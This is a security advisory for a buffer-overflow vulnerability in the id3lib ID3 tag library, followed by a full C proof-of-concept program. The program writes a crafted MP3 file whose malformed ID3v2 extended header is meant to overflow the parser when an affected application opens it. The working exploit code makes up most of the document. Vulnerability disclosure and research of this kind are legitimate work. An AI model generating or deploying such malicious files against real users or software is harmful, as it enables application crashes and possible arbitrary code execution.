source: http://www.securityfocus.com/bid/26945/info

The 'id3lib' library is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the affected application or to crash the application, denying further service to legitimate users.

This issue affects versions of id3lib committed to the CVS repository; other versions may also be affected.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>



#define VER     "0.1"
#define u8      unsigned char
#define MASK(bits) ((1 << (bits)) - 1)



int w28(u8 *data, unsigned num);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    int     i;
    u8      buff[1024],
            *p;

    setbuf(stdout, NULL);

    fputs("\n"
        "id3lib (devel CVS) array overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <output.MP3>\n"
            "\n", argv[0]);
        exit(1);
    }

    p = buff;
    *p++ = 'I';         // "ID3"
    *p++ = 'D';
    *p++ = '3';
    *p++ = 4;           // ID3v2 4.0
    *p++ = 0;
    *p++ = 1 << 6;      // flags: extended
    p += w28(p, 0);     // this->SetDataSize
    p += w28(p, 0);     // not used by id3lib
    *p++ = 6;           // extflagbytes
    for(i = 0; i < 20; i++) {
        *p++ = 0xcc;
    }

    printf("- create file %s\n", argv[1]);
    fd = fopen(argv[1], "wb");
    if(!fd) std_err();
    fwrite(buff, 1, p - buff, fd);
    fclose(fd);
    printf("- done\n");
    return(0);
}



int w28(u8 *data, unsigned num) {
    const unsigned short BITSUSED = 7;
    const unsigned MAXVAL = MASK(BITSUSED * 4);
    int     i;

    if(num > MAXVAL) num = MAXVAL;

    for(i = 0; i < 4; i++) {
        data[4 - i - 1] = num & MASK(BITSUSED);
        num >>= BITSUSED;
    }
    return(4);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}